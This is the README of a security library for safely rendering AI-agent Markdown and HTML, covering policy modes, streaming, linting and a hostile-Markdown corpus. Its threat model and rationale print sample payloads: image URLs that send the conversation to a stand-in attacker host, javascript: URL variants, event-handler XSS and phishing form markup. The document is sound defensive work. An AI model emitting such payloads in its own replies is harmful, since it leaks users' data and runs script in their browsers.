# render-policy

Safe rendering for content an agent wrote: Markdown and HTML from a model or a tool, shown inside your UI.

- **No string sinks.** Content is sanitized into a `DocumentFragment` and inserted with `replaceChildren()`. `innerHTML` is never used, so the renderer runs unchanged under `require-trusted-types-for 'script'` and creates no Trusted Types policy of its own.
- **A policy, not just a sanitizer.** Which hosts may receive image requests (they happen without a click), which URL schemes links may use, whether agent content may restyle or imitate the host UI, what a blocked image looks like. Three modes: `strict`, `balanced`, `permissive`.
- **Streaming aware.** A half-received link or image is never turned into a request. An unfinished code fence renders as code.
- **Lint the sinks.** An ESLint plugin flags every HTML sink in JS/TS/JSX and `[innerHTML]` bindings in Angular templates, so the safe path is the only path.

Framework-free core with Angular and React adapters.

| Package | What it is | Status |
| --- | --- | --- |
| [`@render-policy/core`](packages/core) | Renderer, policy and modes, sink denylist, URL heuristics, streaming, `createUrlGuard` for URLs outside HTML | 183 unit and property tests + a real-Chromium proof |
| [`@render-policy/angular`](packages/angular) | `[rpRender]` directive, `<rp-markdown>` component, `provideRenderPolicy()` | 11 TestBed tests over the ng-packagr bundle + browser proof in Chromium |
| [`@render-policy/react`](packages/react) | `<RenderPolicyProvider>`, `useRenderPolicy()`, `<RpMarkdown>`, `<RpHtml>` | 12 component tests |
| [`@render-policy/mermaid`](packages/mermaid) | strict Mermaid diagrams as a fragment transform: SVG-only sanitizer, shadow-root isolation | 14 unit tests + browser proof with the real mermaid |
| [`@render-policy/a2ui`](packages/a2ui) | the policy for A2UI (v0.9) surfaces: image, media, icon and `openUrl` values checked after data binding; `Text` held to the catalog's "no HTML, images or links"; a Markdown plug-in for the A2UI renderers | 21 unit tests + browser proof (`updateDataModel`, `formatString`, `openUrl`) |
| [`eslint-plugin-render-policy`](packages/eslint-plugin) | `no-unsafe-innerhtml` (JS/TS/JSX), `no-innerhtml-binding` (Angular templates) | 54 rule tests |
| [`mcp-app-lint`](packages/mcp-app-lint) | SARIF findings about what an MCP App declares (`_meta.ui` CSP lists, permissions, tool visibility, list/read policy differences) and what its HTML does, and about the URLs and `Text` in A2UI message streams; CLI over a package, a directory, the JSON a server returned or A2UI JSONL | 26 rules (19 MCP Apps, 7 A2UI), 38 tests, TypeScript declarations; also the analyzer behind the census |

```
npm install @render-policy/core
```

## Why a policy and not "sanitize, then innerHTML"

An agent UI (a chat that renders Markdown, an MCP App host, an AG-UI or A2UI surface) shows text a model produced after reading sources the user does not control. Everyone knows to sanitize it. The advisories keep coming anyway, and they fall into a few classes that a sanitizer call does not address:

1. **Wrong stage.** Sanitizing the Markdown source instead of the HTML it becomes. `[x](javascript&#58;...)` is harmless as text and a script URL after conversion. render-policy sanitizes last, on the final HTML, always.
2. **Unsafe fallback.** The Markdown step throws on odd input and the code path falls back to raw HTML. render-policy falls back to plain text.
3. **Data leaves without a click.** `![](https://attacker/?q=<the conversation>)` is valid Markdown and every sanitizer keeps it. render-policy decides per host whether an image may load, strips query strings, blocks known sink hosts (webhook catchers, tunnels, forms, public buckets) and flags encoded payloads in paths.
4. **Loose extras.** Inline SVG, MathML, diagram renderers in loose mode, `srcset`, `ping`, forms. Off by default, on by policy.
5. **Streaming.** Re-rendering a growing buffer means the DOM briefly holds `<img src="https://attacker/lea` and then the finished URL. render-policy withholds any construct whose URL is not closed and verified.

The policy is one object, resolved once, and the journal of decisions it made is returned from every render.

## Quick start

### Core

```ts
import { createRenderer } from '@render-policy/core';

const renderer = createRenderer({
  mode: 'balanced',
  policy: { images: { hosts: ['cdn.example.com'] } },
  onDecision: (d) => console.debug('[render-policy]', d.code, d.kind, d.subject, d.reason),
});

// One-shot
renderer.renderMarkdownInto(element, message.content);

// Streaming
const stream = renderer.createStream(element);
for await (const chunk of tokens) stream.push(chunk);
stream.end();
```

`renderHtmlInto()`, `renderTextInto()`, `markdownToFragment()` and `sanitizeHtml()` cover the other shapes. `trustedHTML()` is the escape hatch for a string sink you cannot remove: it returns a `TrustedHTML` where the API exists (through DOMPurify's `dompurify` policy) and a string elsewhere.

Every decision in the journal carries a stable `code` for programs (`scheme-not-allowed`, `sink-host`, `image-host-not-allowed`, `transform-failed`, …) and a `reason` for people. Application code that throws never aborts a render: an `images.rewriteUrl` that fails blocks that one image, a transform that fails is skipped, and the journal says so. Building blocks the renderer is made of (`patchChildren`, `createSanitizer`, the URL heuristics) live in `@render-policy/core/internal`, outside semver. The packages are ESM only; Node 20.19 and later can `require()` them, older CommonJS code needs a dynamic `import()`.

### Angular

```ts
bootstrapApplication(AppComponent, {
  providers: [provideRenderPolicy({ mode: 'balanced', policy: { images: { hosts: ['cdn.example.com'] } } })],
});
```

```html
<div [rpRender]="message.content"></div>
<div [rpRender]="message.content" [rpRenderStreaming]="message.pending"></div>
<rp-markdown [content]="message.content" [streaming]="message.pending" />
```

No `[innerHTML]`, no `DomSanitizer.bypassSecurityTrustHtml()`, nothing for Trusted Types to reject. On the server the content is inserted as text.

### React

```tsx
import { RenderPolicyProvider, RpMarkdown } from '@render-policy/react';

const config = { mode: 'balanced', policy: { images: { hosts: ['cdn.example.com'] } } };

<RenderPolicyProvider config={config}>
  <RpMarkdown content={message.content} streaming={message.pending} className="message" />
</RenderPolicyProvider>
```

`useRenderPolicy(content, { streaming })` returns a ref for any element of your own. React owns the element, the policy owns its children; there is no `dangerouslySetInnerHTML` anywhere. On the server the component renders an empty container.

### ESLint

```js
// eslint.config.js
import renderPolicy from 'eslint-plugin-render-policy';
import templateParser from '@angular-eslint/template-parser';

export default [
  renderPolicy.configs.recommended,
  { ...renderPolicy.configs['angular-templates'], languageOptions: { parser: templateParser } },
];
```

### Claude Code plugin

Two skills: one replaces HTML sinks in code that shows agent output with these packages, the other runs `mcp-app-lint` on an MCP App and fixes what it reports. Details in [`plugins/render-policy`](plugins/render-policy).

```bash
claude plugin marketplace add shteynu/render-policy
claude plugin install render-policy@render-policy
```

`no-unsafe-innerhtml` flags `innerHTML`/`outerHTML` assignment, `insertAdjacentHTML`, `setHTMLUnsafe`, `createContextualFragment`, `document.write`, `bypassSecurityTrustHtml` and `dangerouslySetInnerHTML` with anything but a static string. `no-innerhtml-binding` flags `[innerHTML]`, `[(innerHTML)]`, `bind-innerHTML`, `[innerHtml]` and `[outerHTML]` in Angular templates.

## Modes

Sanitization is the same in every mode: no scripts, no event handlers, no forms, no styles, no unknown elements. Modes decide where data may flow.

| | strict | balanced (default) | permissive |
| --- | --- | --- | --- |
| Remote images | none | allowlisted hosts only, exact match | any host |
| Image query string | stripped | stripped | kept |
| Sink denylist | block | block | log only |
| URL heuristics (length, entropy) | on | on | off |
| Blocked image | placeholder link | placeholder link | n/a |
| Same-origin and relative images | allowed | allowed | allowed |
| Links | http, https, mailto, tel | same | same |

Strict is for surfaces that show untrusted sources (web browsing agents, inbound email). Balanced is the default: it breaks nothing except remote images you did not list. Permissive keeps the sanitizer and turns the rest into a journal, for migration and for measuring what a stricter mode would block.

## Policy reference

The policy has three groups: `content` (which elements, attributes and classes agent output may carry), `urls` (which URLs any attribute may point at) and `images` (what happens to the image requests those URLs would make). An override names only the fields it changes; each group is merged onto the mode preset, so `policy: { images: { hosts: ['cdn.example'] } }` keeps every other image and URL default.

**`content`**

| Field | Default | Meaning |
| --- | --- | --- |
| `allowImages` | `true` | Allow `<img>` at all. |
| `allowTargetBlank` | `true` | Keep `target="_blank"` (other targets are dropped). `rel="noopener noreferrer"` is always set when a target is present. |
| `allowForms` | `false` | Form controls. Off: a rendered password field is a phishing form inside the chat. |
| `allowSvg` | `false` | Inline SVG (DOMPurify's sanitized subset). |
| `allowMedia` | `false` | `audio`, `video`, `source`, `track`, `picture`: they request URLs without a click, like images, but without the image policy. |
| `allowInlineStyles` | `false` | The `style` attribute. `<style>` elements are always removed. |
| `allowDataAttributes` | `false` | `data-*`. Host scripts commonly read them as configuration. |
| `allowedClassPatterns` | `language-*`, `rp-*` | Class names the content may carry; everything else is stripped, so agent content cannot borrow host CSS. |
| `forbidTags`, `forbidAttributes` | `[]` | Extra denials on top of the built-in ones. |

**`urls`**

| Field | Default | Meaning |
| --- | --- | --- |
| `allowedSchemes` | `http, https, mailto, tel` | Schemes allowed in `href`, `src` and every other URL attribute. Everything else is dropped, after browser-style normalization (`java\tscript:` is `javascript:`). |
| `allowRelativeUrls` | `true` | Scheme-less URLs resolve against the host page. Protocol-relative (`//host`, `\\host`) counts as remote. |
| `heuristics` | `{ maxLength: 2048, maxTokenLength: 64, minEntropy: 4 }` | Block remote image URLs that are too long or carry a long high-entropy or hex token in the path or query. `false` disables. |
| `sinkDenylist` | `'block'` | Hosts that exist to receive data: OAST services, request catchers, tunnels, anonymous serverless endpoints, form builders, public object storage. [The list](packages/core/src/data/sink-domains.ts) is data with its own version; replace it with `createRenderer({ sinkDenylist })`. A pattern matches a host and its subdomains, optionally narrowed by a path prefix; `*` stands for part of one host label or path segment (`s3.*.amazonaws.com`, `discord.com/api/*/webhooks`). An explicit `images.hosts` entry wins over the denylist. |
| `decide` | `null` | Application hook run for every URL after the checks above, for links and images alike (an image reaches it only after the `images` host, query and heuristic checks, with its query already handled): return `{ allow: false }` to drop it, `{ rewrite }` to route it (a link through a redirector, an image through a proxy; re-checked against `allowedSchemes`), or `null` to leave it. This is where a link policy lives. If it throws, that one URL is dropped and the render goes on. |

**`images`** (image requests fire without a click)

| Field | Default | Meaning |
| --- | --- | --- |
| `hosts` | `[]` | `'none'`, `'any'`, or exact host patterns (`host[:port]`). Same-origin images are always allowed. |
| `allowWildcardHosts` | `false` | Honour `*.example.com`. A wildcard allows every subdomain, including user-controlled ones, so it is an explicit choice; a wildcard without it throws at startup. |
| `query` | `'strip'` | Keep, strip or reject query strings on remote images. Stripping breaks signed URLs and defeats `?data=` exfiltration; choose per host with `rewriteUrl`. |
| `rewriteUrl` | `null` | Rewrite allowed remote images, for example through an image proxy. `null` blocks the image. Runs after every other image check; route images here, not through `urls.decide`. Building the proxy itself without opening an SSRF hole: [docs/image-proxy.md](docs/image-proxy.md). |
| `blocked` | `'placeholder'` | Replace a blocked image with `<a class="rp-blocked-image" href="…" target="_blank" rel="noopener noreferrer">[image blocked: alt]</a>` (the "click to open" pattern), or remove it. The placeholder goes through the same policy: a sink host gets no link either. |

Always removed, in every mode: `script`, `style`, `template`, `iframe`, `object`, `embed`, `base`, `meta`, `link`, `math`, `dialog`, `marquee`; the attributes `srcset`, `sizes`, `ping`, `background`, `formaction`, `action`, `usemap`, `is`, `slot`, `part`, `popover*`, `contenteditable`, `autofocus`, and every `on*` handler. `id` and `name` are prefixed (`user-content-`) against DOM clobbering.

## Threat model

| Threat | Example | Default outcome | Mechanism | Test |
| --- | --- | --- | --- | --- |
| Script execution through markup | `<script>`, `<img onerror>`, `<svg onload>` | blocked | DOMPurify HTML profile; `on*` tripwire in `afterSanitizeAttributes` | `sanitize.test.ts` |
| Script execution through a URL | `javascript:`, `vbscript:`, `data:text/html`, entity-encoded and control-character variants | blocked | scheme allowlist on every URL attribute, resolved against the page exactly as the browser resolves it | `sanitize.test.ts`, `regressions.test.ts` #1, `e2e/url-parity.mjs` |
| Data exfiltration without a click | `![](https://attacker/?q=secret)` | blocked | image host allowlist (empty by default), query stripping, sink denylist, path entropy check | `policy.test.ts`, `regressions.test.ts` #5 |
| Exfiltration through an allowed host | `https://cdn.example/<base64 conversation>.png` | blocked | length and entropy heuristics on path and query tokens | `regressions.test.ts` #5 |
| Exfiltration during streaming | `![](https://attacker/lea` rendered mid-stream | never requested | link, image, autolink, tag and reference-definition withholding until the URL closes | `stream.test.ts`, `e2e/run.mjs` |
| Phishing UI inside the chat | `<form><input type=password>` | blocked | form controls forbidden | `sanitize.test.ts` |
| Host restyling, overlays, clickjacking | `<style>`, `style="position:fixed"`, `class="modal-open"` | blocked | style tag and attribute forbidden, class allowlist | `sanitize.test.ts` |
| Host script gadgets | `data-toggle="modal"`, `<a id="location">` | blocked | `data-*` forbidden, `id`/`name` prefixed | `sanitize.test.ts` |
| Reverse tabnabbing | `<a target="_blank" rel="opener">` | mitigated | `rel="noopener noreferrer"` enforced | `sanitize.test.ts` |
| SVG through `data:` URLs | `<img src="data:image/svg+xml,…">` | blocked | `data:` is not an allowed scheme; blocked in every mode | `regressions.test.ts` #3 |
| Diagram renderers in loose mode | ```` ```mermaid ```` with `click … "javascript:"` | stays text; with `@render-policy/mermaid`, a strict diagram with no link | no diagram renderer in core; the transform forces `securityLevel: 'strict'`, sanitizes the SVG and isolates it | `regressions.test.ts` #4, `packages/mermaid/e2e` |
| Unsafe fallback | Markdown parser throws | plain text | text-node fallback, decision journaled | `regressions.test.ts` #2 |
| Trusted Types violations | `innerHTML` under `require-trusted-types-for 'script'` | none | no string sinks anywhere; only `trustedHTML()` touches a policy | `e2e/run.mjs` |

What is deliberately **not** covered:

- The text itself. Prompt injection, a misleading answer, a link to a convincing phishing page on an allowed host: rendering cannot judge content. render-policy makes the rendered output inert; it does not make it true.
- CSP. Set one; the renderer needs nothing beyond `trusted-types dompurify` if you use `trustedHTML()`. `img-src` is the second line behind `images.hosts`.
- iframes and MCP App sandboxes. Host-side isolation of embedded apps is a different problem, on the roadmap as a separate test suite.
- Server-side rendering. Sanitizing needs a DOM; on the server the Angular adapter emits text.

## Streaming

`createStream(target)` keeps the growing text and re-renders it on every `push()` (or once per animation frame with `frameScheduler(window)`). Before each intermediate render it:

- cuts the buffer before an inline link or image whose destination has no closing parenthesis, a bare `https://` or `www.` URL still being typed, a raw tag without its `>`, and a link reference definition on the last line;
- closes an unfinished ```` ``` ```` or `~~~` fence so a streaming code block renders as code rather than as Markdown.

`end()` renders the final text once with nothing withheld and returns that render's decisions. Everything rendered, intermediate or final, goes through the same policy.

Each intermediate render converts and sanitizes the whole buffer, but only the DOM from the first changed block is replaced (`patchChildren`): settled blocks keep their nodes, so nothing above the cursor flickers or loses its selection. The cost of a push therefore grows with the length of the reply; re-parsing only the unsettled tail is future work (streaming v2 on the [roadmap](ROADMAP.md)), held to a property test that the incremental result matches a whole-buffer render exactly. Timings are in [Size and speed](#size-and-speed).

Framework adapters share one lifecycle, `createContentBinding(renderer, element, { mode, schedule, onDecisions })`: `update(content, streaming)` starts a stream on the first streaming update, feeds it while streaming stays true, ends it with a final render when streaming turns false, and renders in one shot otherwise. The React hook and both Angular directives are thin wrappers over it; an adapter for another framework is the same ten lines.

## Size and speed

Measured with `npm run size` (esbuild, minified, then gzip and brotli) and `npm run bench` (a real headless Chromium) on 30 Sep 2026 in a shared cloud container. Your machine will differ; the ratios should not.

| Bundle | minified | gzip | brotli |
| --- | --- | --- | --- |
| `@render-policy/core` (own code) | 17.5 kB | 6.6 kB | 5.9 kB |
| `@render-policy/core` + DOMPurify + marked (everything a page ships) | 91.5 kB | 30.6 kB | 27.6 kB |
| `@render-policy/react` (own code) | 1.6 kB | 0.7 kB | 0.6 kB |
| `@render-policy/angular` (own code) | 3.8 kB | 1.3 kB | 1.1 kB |
| `@render-policy/mermaid` (own code, mermaid itself not included) | 33.2 kB | 12.9 kB | 11.5 kB |

One-shot rendering in `balanced` mode of generated Markdown that looks like an assistant reply (prose with links and inline code, lists, fences, tables, images that the policy blocks):

| Document | Markdown to DOM (median / p95) | HTML to DOM only (median) | DOM nodes |
| --- | --- | --- | --- |
| 8 kB | 9.2 ms / 12.5 ms | 4.0 ms | 177 |
| 64 kB | 27.8 ms / 35.4 ms | 22.1 ms | 1,461 |
| 256 kB | 118 ms / 132 ms | 100 ms | 5,829 |

Streaming the same documents in 32-byte chunks, about a token each. Each push re-parses and re-sanitizes the whole buffer, then patches only the changed tail into the DOM:

| Scenario | per push (median / p95 / max) | whole reply |
| --- | --- | --- |
| 8 kB, render on every push | 2.1 ms / 5.7 ms / 7.8 ms | 0.6 s |
| 64 kB, render on every push | 17.2 ms / 41.4 ms / 59.5 ms | 37 s |
| 64 kB, 4 chunks per animation frame through `frameScheduler` | render per frame paced by the frame rate | 18 s |

What the numbers say:

- For a short reply the Markdown parse is about half of the time; for a long one the sanitize-and-insert step dominates. Neither is free, and there is no `innerHTML` shortcut to take: the policy needs the DOM.
- A reply of the usual size, a few kB, costs single-digit milliseconds per push. Each intermediate render re-parses the whole buffer, so the cost of a push grows with the length of the reply, and a 64 kB reply is over the frame budget towards its end. `patchChildren` keeps settled nodes in place (no flicker, no re-fetch of images, no lost selection) but does not change that; re-parsing only the unsettled tail (streaming v2) is what removes the growth, and is future work gated on the equivalence property.

## Trusted Types and CSP

The core never assigns `innerHTML`, `outerHTML` or `srcdoc`, never calls `insertAdjacentHTML` or `document.write`. DOMPurify parses through `DOMParser`, which is not a Trusted Types sink, and returns a fragment that is inserted with `replaceChildren()`. Under

```
Content-Security-Policy: require-trusted-types-for 'script'
```

everything works with no policy allowlisted. DOMPurify creates a policy named `dompurify` when the API exists, so a CSP that names policies should include it, otherwise DOMPurify logs a warning and `trustedHTML()` returns a string:

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify
```

The browser proof in `e2e/run.mjs` loads the demo under exactly that header and asserts zero `securitypolicyviolation` events.

## Demo and browser proofs

`demo/index.html` renders the same hostile Markdown twice: with `innerHTML = marked(text)` and with `renderMarkdownInto()`. It is deployed at [shteynu.github.io/render-policy](https://shteynu.github.io/render-policy/), with a [Trusted Types variant](https://shteynu.github.io/render-policy/trusted-types.html) where the naive panel is rejected by the browser.

`npm run e2e` runs three proofs in a real Chromium, checking from outside the page:

- `e2e/run.mjs`: the naive panel executes the payload and requests attacker hosts, the policy panel does neither; zero violations under `require-trusted-types-for 'script'`; a streamed image URL is requested exactly once, after it is complete.
- `packages/angular/e2e/run.mjs`: a standalone Angular application over the ng-packagr bundle; the directive and the streaming component render through the policy, write no `innerHTML` anywhere in the application, keep settled nodes across streaming updates, and run under Trusted Types enforcement.
- `e2e/site.mjs`: the static Pages build behaves the same without server headers.
- `e2e/url-parity.mjs`: URL classification against Chromium's own parser on 115,810 generated strings (schemes in every spelling, control characters at every position, look-alike separators, backslashes, double schemes, hosts with credentials and confusables): every string the browser resolves to a scheme outside the allowlist is blocked, every allowed one agrees with the browser on scheme and hostname, nothing survives sanitization with a disallowed scheme, and nothing the browser accepts is over-blocked.

```
npm ci
npm run build
npm run e2e
```

## Diagrams

```ts
import mermaid from 'mermaid';
import { createMermaidTransform } from '@render-policy/mermaid';

const renderer = createRenderer({ transforms: [createMermaidTransform({ mermaid })] });
```

`transforms` post-process every sanitized fragment before insertion, with a context that says whether the render is streaming and whether the source ends inside an open code fence. The Mermaid transform renders in `securityLevel: 'strict'` without HTML labels, sanitizes the SVG (no links, scripts, `foreignObject`, images, external references, `:host` or `@import` in styles), and isolates the result in a shadow root inside a `contain: paint` wrapper. Open fences stay code until they close; finished diagrams stay in place while the rest streams. Details in [`packages/mermaid`](packages/mermaid).

## Structured agent UI (A2UI)

An [A2UI](https://a2ui.org) agent sends components and a data model instead of HTML. The URLs in
them are still fetched without a click (`Image`, `Video`, `AudioPlayer`, the surface icon) or
navigated to (`openUrl`), and they are usually bound to the data model or assembled by
`formatString`, so the effective value exists only at render time. `@render-policy/a2ui` checks that
value with the same policy, denylist and journal as the core, and holds `Text` to the catalog's
contract:

```ts
import { createA2uiGuard } from '@render-policy/a2ui';

const guard = createA2uiGuard({ policy: { images: { hosts: ['cdn.example.com'] } } });
const result = guard.url('image', resolvedUrl, { surfaceId, componentId });
if (result.allowed) img.src = result.value;
```

`createUrlGuard` in the core is the same URL check for any other place agent output carries a URL as
data. Details in [`packages/a2ui`](packages/a2ui).

## Evil-Markdown corpus

[`corpus/`](corpus) holds 54 hostile-Markdown cases and 24 A2UI cases with the invariants a safe renderer must hold, and a runner that checks any renderer in Chromium through a ten-line adapter. Results for the three reference adapters ([`corpus/RESULTS.md`](corpus/RESULTS.md)):

| Category | marked + innerHTML | DOMPurify defaults + innerHTML | @render-policy/core, balanced defaults |
| --- | --- | --- | --- |
| script execution | 1 / 8 | 7 / 8 | 8 / 8 |
| URL schemes | 0 / 7 | 6 / 7 | 7 / 7 |
| exfiltration | 0 / 20 | 4 / 20 | 20 / 20 |
| UI spoofing | 0 / 6 | 1 / 6 | 6 / 6 |
| DOM clobbering | 0 / 2 | 1 / 2 | 2 / 2 |
| Markdown-specific | 3 / 3 | 3 / 3 | 3 / 3 |
| guards against over-blocking | 4 / 5 | 5 / 5 | 5 / 5 |
| streaming | 2 / 3 | 2 / 3 | 3 / 3 |

DOMPurify's defaults are not wrong: they answer the XSS question. The corpus asks the other questions, and those are the policy's job.

24 more cases are A2UI v0.9 message streams: image, video, audio and icon URLs that arrive through data binding or `formatString` (also a value swapped after a clean first render), `openUrl` targets outside http and https, and `Text` that breaks the catalog's "no HTML, images or links". Each reference adapter renders them on a minimal surface with the same hooks:

| Category | values as given, `Text` via innerHTML | values as given, `Text` via DOMPurify defaults | @render-policy/a2ui, balanced defaults |
| --- | --- | --- | --- |
| exfiltration | 0 / 11 | 0 / 11 | 11 / 11 |
| script execution | 0 / 1 | 1 / 1 | 1 / 1 |
| URL schemes (`openUrl`) | 0 / 4 | 0 / 4 | 4 / 4 |
| UI spoofing | 0 / 3 | 0 / 3 | 3 / 3 |
| guards against over-blocking | 5 / 5 | 5 / 5 | 5 / 5 |

```
node corpus/run.mjs --adapter ./my-renderer.mjs --results my-results.md
```

## MCP Apps census

[`census/`](census) measures what public MCP servers declare about the interfaces they ask hosts to render: the `_meta.ui` of `ui://` resources (CSP domain lists, permissions), tool visibility, and what the HTML of those resources does on its own (inline `innerHTML` sinks are found with this repository's own ESLint rule). Aggregates only, in [`census/SUMMARY.md`](census/SUMMARY.md), including a breakdown of the declared hosts by category (fonts, analytics, maps, storage, media, CDNs, APIs, development leftovers, sinks). The analyzer became [`mcp-app-lint`](packages/mcp-app-lint): the same checks as SARIF rules for scanners and CI. A draft write-up of the results is in [`docs/writeup-mcp-apps-census.md`](docs/writeup-mcp-apps-census.md). [`conformance/`](conformance) closes the loop: a Chromium check that a host enforces the very policy the census measures, built from the specification's own CSP formula.

## Roadmap

See [ROADMAP.md](ROADMAP.md). Next: A2UI components for the React and Angular adapters, evil-mcp-app (a Playwright suite that grades MCP Apps hosts), and streaming v2 (re-parse only the unsettled tail).

## Security

See [SECURITY.md](SECURITY.md). Findings in this library are welcome through private reporting; findings in other projects that this library was written against are disclosed to those projects first.

## License

MIT.
